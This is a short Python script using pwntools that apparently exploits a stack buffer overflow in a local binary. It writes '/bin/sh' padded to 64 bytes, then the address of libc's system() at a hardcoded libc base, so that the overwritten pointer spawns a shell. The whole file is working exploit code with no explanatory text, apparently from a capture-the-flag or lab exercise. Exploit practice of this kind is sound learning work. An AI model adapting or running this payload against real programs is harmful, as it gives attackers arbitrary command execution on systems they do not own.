import sys
import struct
from pwn import *

context.arch = "amd64"
context.log_level = 'critical'

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000

payload = b"/bin/sh\0"
payload += b"A"*(64 - len(payload))

payload += p64(libc.sym["system"])

sys.stdout.buffer.write(payload)